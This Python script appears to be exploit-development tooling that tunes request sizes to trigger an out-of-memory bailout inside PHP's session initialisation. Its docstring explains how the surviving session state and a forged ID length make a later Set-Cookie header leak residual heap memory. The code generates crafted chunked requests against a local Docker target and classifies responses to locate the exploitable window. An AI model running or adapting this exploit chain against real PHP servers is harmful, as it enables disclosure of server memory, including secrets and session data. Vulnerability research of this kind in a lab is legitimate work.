#!/usr/bin/env python3
"""Black-box A1 tuner v2: find heap pressure where OOM lands in the vulnerable window.

VULNERABLE-WINDOW STATE (source-verified, php-src@8.5.11):
  A must abort via zend_bailout() INSIDE php_session_initialize()/reset_id(),
  AFTER create_sid (PS(id)=fresh-sid LIVE) and PS(send_cookie)=1, BEFORE
  reset_id clears send_cookie. The bailout longjmp skips the END handler's
  php_rshutdown_session_globals() AND A's RINIT -> state survives into B:
    B END-cleanup initialize: PS(id) non-empty (forged header overwrites it),
    use_strict_mode=0, send_cookie=1 -> reset_id -> php_session_send_cookie ->
    php_url_encode(ZSTR_VAL(PS(id)), ZSTR_LEN(PS(id))) with forged len 0xC8000
    -> Set-Cookie carries url-encoded residual heap = LEAK.

SIGNATURES (black-box, no gdb):
  VULN_WINDOW : fatal + alloc < 2048 bytes + NEW /tmp/sess_* file in container
                (create_sid's collision check created it before the failing
                 small alloc) -> EXPLOITABLE STATE GUARANTEED. *** TARGET ***
  PARSE_OOM_S : fatal + alloc < 2048, no new sess file -> OOM during parse on a
                small alloc (e.g. tail-field name/value). NOT exploitable.
  TOO_LATE    : cookie + decode warning -> END-cleanup completed, state NULLed.
  PARSE_OOM   : no cookie, fatal with large alloc -> OOM during parse.
  NO_OOM      : no fatal.

Usage: python3 tune_a1.py [--parts N] [--tail N] [--burner-len N] [--progress-len N] [big-len ...]
"""
import os, re, subprocess, sys

HOST, PORT = "127.0.0.1", "18110"
Q = "/index.php?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"
NINEBIE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "ninebie")

def sess_files() -> set:
    r = subprocess.run(["docker", "exec", "p2s", "sh", "-c", "ls /tmp/sess_* 2>/dev/null"],
                       capture_output=True, text=True)
    return set(r.stdout.split())

ALLOC_RE = re.compile(rb"tried to allocate (\d+) bytes")

def run(big_len: int, parts: int = 860, tail: int = 0, burner_len: int = 4000,
        progress_len: int = 4000) -> str:
    tag = f"{parts}_{big_len}_t{tail}_b{burner_len}_p{progress_len}"
    body = f"/tmp/p2s-lab/a_{tag}.bin"
    os.makedirs("/tmp/p2s-lab", exist_ok=True)
    r = subprocess.run(["python3", os.path.join(NINEBIE, "pure/mk_a1.py"), "--out", body,
                        "--big-len", str(big_len), "--parts", str(parts),
                        "--tail", str(tail), "--burner-len", str(burner_len),
                        "--progress-len", str(progress_len)],
                       capture_output=True, text=True)
    if r.returncode != 0:
        return "GEN_FAIL:" + (r.stderr or "")[:200]
    before = sess_files()
    resp_f = body + ".resp"
    subprocess.run(["python3", os.path.join(NINEBIE, "pure/chunked_send.py"), "--host", HOST,
                    "--port", PORT, "--body-file", body, "--path", Q,
                    "--timeout", "120", "--save-response", resp_f],
                   capture_output=True)
    after = sess_files()
    new_sess = sorted(after - before)
    try:
        raw = open(resp_f, "rb").read()
    except FileNotFoundError:
        return "NO_RESP"
    cookie = b"Set-Cookie: PHPSESSID=" in raw
    fatal  = b"Allowed memory size" in raw
    decode = b"Failed to decode session object" in raw
    readw  = b"Failed to read session data" in raw
    m = ALLOC_RE.search(raw)
    alloc = int(m.group(1)) if m else None
    sid_note = (" new-sess=" + ",".join(os.path.basename(s)[-8:] for s in new_sess[:3])
                ) if new_sess else ""
    if not fatal:
        return "NO_OOM (cookie=%s)%s" % (cookie, sid_note)
    if decode or readw:
        return "TOO_LATE (decode=%s readwarn=%s alloc=%s)" % (decode, readw, alloc)
    if cookie:
        return "COOKIE_NO_DECODE alloc=%s%s  <-- CHECK MANUALLY" % (alloc, sid_note)
    # no cookie + fatal:
    if alloc is not None and alloc < 2048:
        if new_sess:
            return "*** VULN_WINDOW *** alloc=%d%s" % (alloc, sid_note)
        return "PARSE_OOM_S alloc=%d (no sess file -> parse-time small OOM)" % alloc
    return "PARSE_OOM alloc=%s" % alloc

if __name__ == "__main__":
    # usage: tune_a1.py [--parts N] [--tail N] [--burner-len N] [big-len ...]
    args = sys.argv[1:]
    kw = {}
    for opt in ("--parts", "--tail", "--burner-len", "--progress-len"):
        if opt in args:
            i = args.index(opt)
            key = {"--parts": "parts", "parts": "parts", "--tail": "tail",
                   "--burner-len": "burner_len", "--progress-len": "progress_len"}[opt]
            kw[key] = int(args[i + 1])
            del args[i:i + 2]
    for bl in [int(x) for x in args] or [8000]:
        print("big-len=%-7d %s -> %s" % (bl, kw, run(bl, **kw)), flush=True)
